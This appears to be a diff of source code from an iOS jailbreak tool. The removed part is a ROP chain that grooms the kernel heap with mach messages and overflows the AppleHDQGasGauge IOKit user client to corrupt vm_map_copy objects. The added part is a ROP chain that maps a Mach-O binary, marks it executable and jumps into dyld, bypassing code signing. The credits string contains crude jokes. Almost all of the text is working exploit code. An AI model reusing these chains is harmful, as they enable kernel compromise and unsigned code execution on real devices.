-        char* oflow_leakedbytes;
-        struct vm_map_copy* oflow_vm_map;
-        oolmsg_t oolmsg_template;
-        oolmsg_t oolmsg_template_2048;
-        oolmsg_t oolmsg_template_512;
-        oolmsgrcv_t cur_oolmsg;
-        oolmsgrcv_t tmp_msg;
-        oolmsgrcv_t oflow_msg;
-#define overlap_port 955
-#define overlapped_port 950
-        mach_port_t holder[1000];
-        char oolbuf[2048];
-        int x;
-        int tmp1;
-        int tmp2;
-        uint64_t kern_alloc_1024;
-        uint64_t vptr;
-        uint64_t kern_slide;
-        uint64_t kern_text_base;
-        uint64_t ktmp;
-        char mscratch[8192];
-        char scratch[8192];
-        char kvt[8192];
-        mach_timespec_t waitTime;
-        char* spawnp[2];
-        char spawnpath[256];
-    } args_t;
     
     args_t args_s;
     bzero(&args_s, sizeof(args_s));
     args_t* argss = &args_s;
     args_t* args_seg = (args_t*) 0x52000000;
+
+	// copyrights
+	NSLog(@"yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\njk++\n");
+
     
-#define m_m_scratch ((uint32_t)(&(args_seg->mscratch)[1024]))
-#define PUSH (*stack++)
-#define SEG_VAR(var) ((char*)(&(args_seg->var)))
-#define SEG_VAR_(var, i) ((uint32_t)(&((args_seg->var)[i])))
-    
-    
-    argss->waitTime.tv_sec = 10;
-    argss->waitTime.tv_nsec = 10000000;
-    
-    argss->_io_connect_add_client = IOKIT_io_connect_add_client - _DYCACHE_BASE + 1;
-    argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - _DYCACHE_BASE + 1;
-    argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - _DYCACHE_BASE + 1;
-    argss->_IOServiceOpen = IOKIT_IOServiceOpen - _DYCACHE_BASE + 1;
-    argss->_IOServiceClose = IOKIT_IOServiceClose - _DYCACHE_BASE + 1;
-    argss->_IOServiceWaitQuiet = IOKIT_IOServiceWaitQuiet - _DYCACHE_BASE + 1;
-    argss->_host_get_io_master = LS_K_host_get_io_master - _DYCACHE_BASE + 1;
-    argss->oolmsg_template.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    argss->oolmsg_template.header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
-    argss->oolmsg_template.header.msgh_local_port = MACH_PORT_NULL;
-    argss->oolmsg_template.header.msgh_size = sizeof(oolmsg_t);
-    argss->oolmsg_template.header.msgh_id = 1;
-    argss->oolmsg_template.body.msgh_descriptor_count = 1;
-    argss->oolmsg_template.desc.address = (void *)SEG_VAR(oolbuf);
-    argss->oolmsg_template.desc.type = MACH_MSG_OOL_DESCRIPTOR;
-    memcpy(&argss->oolmsg_template_2048, &argss->oolmsg_template, sizeof(oolmsg_t));
-    memcpy(&argss->oolmsg_template_512, &argss->oolmsg_template, sizeof(oolmsg_t));
-    
-    argss->oolmsg_template_2048.desc.size = 2048 - 0x58;
-    argss->oolmsg_template_512.desc.size = 512 - 0x58;
-    argss->oolmsg_template.desc.size = 1024 - 0x58;
-    
-    memset(&argss->oolbuf[0], 0x0, 1024);
+    NSLog(@"sizeof(args_t) = %lx", sizeof(args_t));
+
     uint32_t tmp;
-    *stack++ = 0x44444444;
-    *stack++ = m_m_scratch;
+    // after mov_sp_r4_pop_r4r7pc gadget
+    *stack++ = 0x44444444; // R4
+    *stack++ = m_m_scratch; // R7
     
-    strcpy(argss->initmsg, "yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\njk++\n");
+    ///////////////////////////////
+    // START FriedApple bytec0de //
+    ///////////////////////////////
+
+    // get LR
+    *stack++ = mov_r0_lr_pop_r7pc;
+    *stack++ = m_m_scratch; // R7
+    RopAddR0(PUSH, 0xFFFE3577);
+    StoreR0(PUSH, SEG_VAR(__dyld_start));
+  
+    strcpy(argss->a, "/var/mobile/Media/amfistop64");
     
-    strcpy(argss->gasgauge_match, "<dict><key>IOProviderClass</key><string>AppleHDQGasGaugeControl</string></dict>");
-    strcpy(argss->rootdomainuserclient_match, "<dict><key>IOProviderClass</key><string>IOPMrootDomain</string></dict>");
-    strcpy(argss->a, "/var/mobile/Media/kjc_jb.log");
-    strcpy(argss->b, "/var/mobile/Media/vm_map_dump");
-    strcpy(argss->c, "/var/mobile/Media/kern_dump");
-    strcpy(argss->msga, "found overlapping object\n");
-    strcpy(argss->msgb, "found overlapped object\n");
-    strcpy(argss->testmsg, "ret: %08x\n");
-    
-    RopFixupLR(PUSH);
-    RopCallFunction2(PUSH, @"___syscall", 294, SEG_VAR(cache_slide));
-    RopCallFunction1(PUSH, @"___syscall", SYS_sync);
-    
-    
-    RopCallFunction3(PUSH, @"_open", SEG_VAR(a), O_RDWR|O_CREAT|O_APPEND, 0666);
+    void *indata;
+    const char *localPath = "../untether/amfistop64";
+	NSLog(@"Using %s as local copy (remote path %s)", localPath, argss->a);
+    // read file (need to read on ROP too)
+    int fd_local = open(localPath, O_RDWR);
+    // dub for ROP
+    RopCallFunction2(PUSH, @"_open", SEG_VAR(a), O_RDWR);
+    // save fd
     StoreR0(PUSH, SEG_VAR(fd1));
-    RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
-    StoreR0(PUSH, SEG_VAR(fd2));
-    RopCallFunction3(PUSH, @"_open", SEG_VAR(c), O_RDWR|O_CREAT|O_TRUNC, 0666);
-    StoreR0(PUSH, SEG_VAR(fd3));
     
-    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_add_client), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceClose), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_io_service_get_matching_service), SEG_VAR(cache_slide));
-    RopAddWriteDeref(PUSH, SEG_VAR(_host_get_io_master), SEG_VAR(cache_slide));
+    if (fd_local >= 0) {
+        struct stat st;
+        if (fstat(fd_local, &st) >= 0) {
+            int mmap_prot = PROT_READ | PROT_WRITE;
+            int mmap_flag = MAP_PRIVATE;
+            size_t size = (size_t)st.st_size;
+            indata = mmap(NULL, size, mmap_prot, mmap_flag, fd_local, 0);
+            // dub for ROP
+            RopCallFunction7Deref1(PUSH, @"___mmap", 4, SEG_VAR(fd1), NULL, size, mmap_prot, mmap_flag, -123, 0, 0);
+            
+            // save memory page address
+            StoreR0(PUSH, SEG_VAR(indata));
+            // close fd
+            close(fd_local);
+            // dub for ROP
+            RopCallFunction1Deref1(PUSH, @"_close", 0, SEG_VAR(fd1), -123);
+            if (indata) {
+                // Not require to be changed on ROP version (check MACHo for correctness)
+                mach_hdr* hdr = (mach_hdr*) indata;
+                if (hdr->magic != MH_MAGIC_) {
+                    NSLog(@"not a mach-o, contents: %s", indata);
+                    exit(0);
+                }
+                
+                vm_address_t base = 0;
+                vm_address_t end = 0;
+                uintptr_t text_size = 0;
+                
+                // Not require to be changed on ROP version (calculate base and end)
+                struct load_command* lc = (struct load_command*) (hdr+1);
+                for (int i = 0; i < hdr->ncmds; i++) {
+                    if (lc->cmd == LC_SEGMENT_COMMAND) {
+                        sgmt_cmd* sg = (sgmt_cmd*)lc;
+                        if (!(sg->fileoff == 0 && sg->filesize == 0 && sg->vmaddr == 0)) {
+                            if (sg->vmaddr < base || base == 0) {
+                                base = sg->vmaddr;
+                            }
+                            if (sg->vmaddr + sg->vmsize > end) {
+                                end = sg->vmaddr + sg->vmsize;
+                            }
+                        }
+                    }
+                    lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
+                }
 
-    
+				// read file on ROP
+                //int fd = open(localPath, O_RDONLY);
+                RopCallFunction2(PUSH, @"_open", SEG_VAR(a), O_RDONLY);
+                // save fd
+                StoreR0(PUSH, SEG_VAR(fd2));
 
-    RopCallFunction0(PUSH, @"_task_self_trap");
-    StoreR0(PUSH, SEG_VAR(mach_task_self));
-    
-    RopCallFunction0(PUSH, @"_host_self_trap");
-    StoreR0(PUSH, SEG_VAR(mach_host_self));
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_host_get_io_master), 0, SEG_VAR(mach_host_self), 4, SEG_VAR(zero), 0, SEG_VAR(master_port), 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_service_get_matching_service), 0, SEG_VAR(master_port), 6, SEG_VAR(zero), 0, SEG_VAR(gasgauge_match), SEG_VAR(svc), 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge), 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    for (int i = 3; i < 500; i++) {
-        RopCallFunction9Deref2(PUSH, @"__kernelrpc_mach_port_allocate_trap", 0, SEG_VAR(mach_task_self), 5, SEG_VAR(zero), 0, MACH_PORT_RIGHT_RECEIVE, SEG_VAR(holder[i]), 0, 0, 0, 0, 0, 0);
-        RopCallFunction9Deref3(PUSH, @"__kernelrpc_mach_port_insert_right_trap", 0, SEG_VAR(mach_task_self), 1, SEG_VAR(holder[i]), 2, SEG_VAR(holder[i]), 0, 0, 0, MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0, 0, 0);
-        LoadIntoR0(PUSH, SEG_VAR(holder[i]));
-        StoreR0(PUSH, SEG_VAR(oolmsg_template.header.msgh_remote_port));
-        RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(oolmsg_template), MACH_SEND_MSG, sizeof(oolmsg_t));
-    }
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref3(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 3, SEG_VAR(gasgauge), 2, SEG_VAR(master_port), 0, SEG_VAR(initmsg), 0, 0, 0, 0, 0, 0, 0);
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(cache_slide),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[480]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
-    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[475]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
-    RopCallFunction9Deref1(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[470]), SEG_VAR(cur_oolmsg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0); // + 1024
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI),
-                                        0, SEG_VAR(gasgauge),
-                                        9, SEG_VAR(zero),
-                                        0, 12,
-                                        SEG_VAR(inputScalar), 1,
-                                        SEG_VAR(structData), (1024+0x100),
-                                        0,0,0,0); // overflow
-    
-    StoreR0(PUSH, SEG_VAR(io_service_open_return));
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(io_service_open_return),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-#define RecvMsg(push, i, msg) \
-LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
-StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
-RopCallFunction9Deref2(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[i]), 5, SEG_VAR(zero), SEG_VAR(msg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0)
-    
-#define SendMsg(push, i, msg) \
-LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
-StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
-RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oolmsg_t))
-    
-    /* read-out corrupted vm_map_copy, causing wrong kfree() & write to adjacent page */
-    
-    for (int i = 450; i < 500; i++) {
-        if (i != 480 && i != 475 && i != 470) {
-            WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
-            RecvMsg(PUSH, i, oflow_msg);
-            StoreR0(PUSH, SEG_VAR(tmp1));
-            
-            PUSH = pop_r4r7pc; // PC
-            uint32_t* wcmpl = stack;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            uint32_t send_1024_cont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            SendMsg(PUSH, i, oolmsg_template);
-            PUSH = pop_r4r7pc; // PC
-            uint32_t* wcont = stack;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            uint32_t send_2048_break = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
-            StoreR0(PUSH, SEG_VAR(holder[overlap_port]));
-            SendMsg(PUSH, i, oolmsg_template_2048);
-            
-            [dy setSlide:dy.slide+1]; // enter thumb
-            RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(msga),0,0,0,0,0,0,0);
-            [dy setSlide:dy.slide-1]; // exit thumb
-            
-            WriteWhatWhere(PUSH,0,SEG_VAR(holder[i]));
-            
-            RopCallFunction9Deref2(PUSH, @"__kernelrpc_mach_port_allocate_trap", 0, SEG_VAR(mach_task_self), 5, SEG_VAR(zero), 0, MACH_PORT_RIGHT_RECEIVE, SEG_VAR(holder[i]), 0, 0, 0, 0, 0, 0);
-            RopCallFunction9Deref3(PUSH, @"__kernelrpc_mach_port_insert_right_trap", 0, SEG_VAR(mach_task_self), 1, SEG_VAR(holder[i]), 2, SEG_VAR(holder[i]), 0, 0, 0, MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0, 0, 0);
-            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
-            StoreR0(PUSH, SEG_VAR(oolmsg_template.header.msgh_remote_port));
-            RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(oolmsg_template), MACH_SEND_MSG, sizeof(oolmsg_t));
-            SendMsg(PUSH, i, oolmsg_template);
-            
-            
-            PUSH = pop_r4r7pc; // PC
-            PUSH = segstackybase; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            *wcmpl = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            
-            /* execute comparison */
-            
-            WriteWhatWhere(PUSH, m_m_scratch, SEG_VAR(tmp2));
-            LoadIntoR0(PUSH, SEG_VAR(tmp1));
-            
-            PUSH = not_r0_pop_r4r7pc;
-            PUSH = (uint32_t)SEG_VAR(tmp2);
-            PUSH = m_m_scratch;
-            PUSH = not_r0_pop_r4r7pc;
-            PUSH = (uint32_t)SEG_VAR(tmp2);
-            PUSH = m_m_scratch;
-            
-            
-            PUSH = pop_r2pc;
-            PUSH = 4*6;
-            PUSH = muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc;
-            PUSH = 0x44444444; // R4
-            PUSH = 0x45454545; // R5
-            PUSH = m_m_scratch; // R7
-            PUSH = pop_r2pc;
-            uint32_t* spz = stack;
-            PUSH = 0;
-            PUSH = add_r0_r2_pop_r4r5r7pc;
-            PUSH = 0x44444444; // R4
-            PUSH = 0x45454545; // R5
-            PUSH = m_m_scratch; // R7
-            
-            PUSH = (uint32_t)pop_r4r7pc;
-            uint32_t *tgt = stack;
-            PUSH = - 8;
-            PUSH = (uint32_t)m_m_scratch;
-            PUSH = (uint32_t)str_r0_r4_8_pop_r4r7pc;
-            PUSH = (uint32_t)0x44444444;
-            PUSH = (uint32_t)m_m_scratch;
-            
-            PUSH = pop_r4r7pc; // PC
-            *tgt += (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            *spz = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            
-            PUSH = 0x44444444;
-            PUSH = m_m_scratch;
-            PUSH = pop_r4r7pc; // PC
-            PUSH = send_1024_cont; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            PUSH = 0x44444444;
-            PUSH = m_m_scratch;
-            PUSH = pop_r4r7pc; // PC
-            PUSH = send_2048_break; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            *wcont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            
+                // calc virtual size
+                size_t vm_size = end - base;
+
+                // mmap file on ROP
+                //void *filedata1 = mmap(NULL, size*2, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+                RopCallFunction7Deref1(PUSH, @"___mmap", 4, SEG_VAR(fd2), NULL, vm_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, -123, 0, 0);
+				NSLog(@"mmap with size %lx (size * 2 = %lx)", vm_size, size * 2);
+                // save filedata1
+                StoreR0(PUSH, SEG_VAR(filedata1));
+                // mmap file on ROP
+                //void *filedata2 = mmap(filedata1, size*2, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, 0, 0);
+                RopCallFunction7Deref1(PUSH, @"___mmap", 0, SEG_VAR(filedata1), -123, vm_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, 0, 0, 0);
+                // save filedata2
+                StoreR0(PUSH, SEG_VAR(filedata2));
+                
+                lc = (struct load_command*) (hdr+1);
+                for (int i = 0; i < hdr->ncmds; i++) {
+                    if (lc->cmd == LC_SEGMENT_COMMAND) {
+                        sgmt_cmd* sg = (sgmt_cmd*)lc;
+                        if (!(sg->fileoff == 0 && sg->filesize == 0 && sg->vmaddr == 0)) {
+                            // calculate address on ROP
+                            //void* addr = (void*)(sg->vmaddr - base + filedata2);
+                            LoadIntoR0(PUSH, SEG_VAR(filedata2));
+                            RopAddR0(PUSH, sg->vmaddr - base); // 0x0021d000
+                            StoreR0(PUSH, SEG_VAR(addr));
+                            // get size
+                            uintptr_t size = sg->vmsize;
+                            
+                            // zero destination memory on ROP
+                            //bzero(addr, size);
+                            RopCallFunction2Deref1(PUSH, @"___bzero", 0, SEG_VAR(addr), -123, size);
+							NSLog(@"bzero(addr, 0x%lx); // &addr = 0x%x  ", size, (void*)&argss->addr + (int)args_seg - (void*)argss);
+                            
+                            // copy data on ROP
+                            //memcpy(addr, indata + sg->fileoff, sg->filesize);
+                            // get indata + sg->fileoff
+                            LoadIntoR0(PUSH, SEG_VAR(indata));
+                            RopAddR0(PUSH, sg->fileoff);
+                            StoreR0(PUSH, SEG_VAR(copyaddr));
+                            // call _bcopy
+                            //RopCallFunction3(PUSH, @"_bcopy", SEG_VAR(addr), SEG_VAR(tmp1), sg->filesize);
+                            [dy setSlide:dy.slide+1]; // enter thumb
+                            RopCallFunction3Deref2(PUSH, @"_bcopy", 0, SEG_VAR(copyaddr), 1, SEG_VAR(addr), -123, -123, sg->filesize);
+                            [dy setSlide:dy.slide-1]; // exit thumb
+                            NSLog(@"bcopy segment %s by offset 0x%x, size 0x%x", sg->segname, sg->fileoff, sg->filesize);
+                            if (strcmp(sg->segname, "__TEXT") == 0) {
+                                // not require to be changed on ROP (calculate text_size)
+                                text_size = sg->filesize;
+                                // need to store address on ROP
+                                //text_addr = (uintptr_t)addr;
+                                LoadIntoR0(PUSH, SEG_VAR(addr));
+                                StoreR0(PUSH, SEG_VAR(text_addr));
+                            }
+                        }
+                    }
+                    lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
+                }
+				
+				//NSLog(@"text_addr %lx, text_size %lx", text_addr, text_size);
+                // mlock __TEXT pages on ROP
+                //mlock((void*)text_addr, text_size);
+                RopCallFunction3Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mlock, -123, text_size);
+				
+				// protect __TEXT pages with PROT_EXEC | PROT_READ on ROP
+                //mprotect((void*)text_addr, text_size, PROT_EXEC | PROT_READ);
+                RopCallFunction4Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mprotect, -123, text_size, PROT_READ|PROT_EXEC);
+                
+                // call ===================>REAL<================== __dyld_start
+                //enter_dyld2((vm_address_t)filedata2, [txtPath UTF8String], __dyld_start);
+                RopCallDerefFunctionPointerStack8Deref1(PUSH, SEG_VAR(__dyld_start), 0, SEG_VAR(filedata2), -123, 1, SEG_VAR(a), 0, SEG_VAR(a), 0, SEG_VAR(a), 0);
+                
+                // no need on ROP, just call SYS_exit
+                //munmap(filedata1, size);
+                RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
+                //ret=true;
+            } else {
+                NSLog(@"Cannot mmap()");
+                exit(1);
+            }
+        } else {
+            NSLog(@"Cannot fstat() file-descriptor");
+            exit(1);
         }
+        close(fd_local);
+    } else {
+        NSLog(@"Cannot open file");
+        exit(1);
     }
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(testmsg),13,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    RecvMsg(PUSH, 480, oflow_msg); // hang
-    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
-    
-    assert(stacky > stack);
-    stack = (uint32_t*)stacky;
-    segstackbase = (uint32_t)segstackybase;
-    stackbase = (uint32_t*)stack;
-    PUSH = 0x44444444; // R4
-    PUSH = m_m_scratch; // R7
-    
-    for (int i = 400; i < 500; i++) {
-        if (i != 480 && i != 475 && i != 470) {
-            WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
-            RecvMsg(PUSH, i, oflow_msg);
-            StoreR0(PUSH, SEG_VAR(tmp1));
-            
-            PUSH = pop_r4r7pc; // PC
-            uint32_t* wcmpl = stack;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            uint32_t send_1024_cont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            SendMsg(PUSH, i, oolmsg_template);
-            PUSH = pop_r4r7pc; // PC
-            uint32_t* wcont = stack;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            uint32_t send_1024_break = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            [dy setSlide:dy.slide+1]; // enter thumb
-            RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(msgb),0,0,0,0,0,0,0);
-            [dy setSlide:dy.slide-1]; // exit thumb
-            
-            LoadIntoR0(PUSH, SEG_VAR(holder[i]));
-            StoreR0(PUSH, SEG_VAR(holder[overlapped_port]));
-            SendMsg(PUSH, i, oolmsg_template);
-            
-            PUSH = pop_r4r7pc; // PC
-            PUSH = segstackzbase; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            *wcmpl = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            
-            /* execute comparison */
-            
-            WriteWhatWhere(PUSH, m_m_scratch, SEG_VAR(tmp2));
-            LoadIntoR0(PUSH, SEG_VAR(tmp1));
-            
-            PUSH = not_r0_pop_r4r7pc;
-            PUSH = (uint32_t)SEG_VAR(tmp2);
-            PUSH = m_m_scratch;
-            PUSH = not_r0_pop_r4r7pc;
-            PUSH = (uint32_t)SEG_VAR(tmp2);
-            PUSH = m_m_scratch;
-            
-            PUSH = pop_r2pc;
-            PUSH = 4*6;
-            PUSH = muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc;
-            PUSH = 0x44444444; // R4
-            PUSH = 0x45454545; // R5
-            PUSH = m_m_scratch; // R7
-            PUSH = pop_r2pc;
-            uint32_t* spz = stack;
-            PUSH = 0;
-            PUSH = add_r0_r2_pop_r4r5r7pc;
-            PUSH = 0x44444444; // R4
-            PUSH = 0x45454545; // R5
-            PUSH = m_m_scratch; // R7
-            
-            PUSH = (uint32_t)pop_r4r7pc;
-            uint32_t *tgt = stack;
-            PUSH = - 8;
-            PUSH = (uint32_t)m_m_scratch;
-            PUSH = (uint32_t)str_r0_r4_8_pop_r4r7pc;
-            PUSH = (uint32_t)0x44444444;
-            PUSH = (uint32_t)m_m_scratch;
-            
-            PUSH = pop_r4r7pc; // PC
-            *tgt += (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            *spz = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            
-            PUSH = 0x44444444;
-            PUSH = m_m_scratch;
-            PUSH = pop_r4r7pc; // PC
-            PUSH = send_1024_cont; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            
-            PUSH = 0x44444444;
-            PUSH = m_m_scratch;
-            PUSH = pop_r4r7pc; // PC
-            PUSH = send_1024_break; // R4
-            PUSH = m_m_scratch; // R7
-            PUSH = mov_sp_r4_pop_r4r7pc; // PC
-            
-            *wcont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
-            PUSH = 0x44444444; // R4
-            PUSH = m_m_scratch; // R7
-            
-        }
-    }
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref1(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 0,SEG_VAR(testmsg),72,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    RecvMsg(PUSH, 480, oflow_msg); // hang
-    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
-    
-    assert(stackz > stack);
-
-    stack = (uint32_t*)stackz;
-    segstackbase = (uint32_t)segstackzbase;
-    stackbase = (uint32_t*)stack;
-    
-    PUSH = 0x44444444; // R4
-    PUSH = m_m_scratch; // R7
-    
-    
-#define ReadWriteOverlap() \
-RecvMsg(PUSH, overlap_port, tmp_msg);\
-LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
-StoreR0(PUSH, SEG_VAR(oolmsg_template_2048.desc.address));\
-SendMsg(PUSH, overlap_port, oolmsg_template_2048);
-    
-#define ReadWriteScratchOverlap() \
-RecvMsg(PUSH, overlap_port, tmp_msg);\
-WriteWhatWhere(PUSH, SEG_VAR(scratch[0]), SEG_VAR(oolmsg_template_2048.desc.address));\
-SendMsg(PUSH, overlap_port, oolmsg_template_2048);
-    
-    
-#define ReadWriteOverlapped1024() \
-RecvMsg(PUSH, overlapped_port, tmp_msg);\
-LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
-StoreR0(PUSH, SEG_VAR(oolmsg_template.desc.address));\
-SendMsg(PUSH, overlapped_port, oolmsg_template);
-    
-#define ReadWriteOverlapped512() \
-RecvMsg(PUSH, overlapped_port, tmp_msg);\
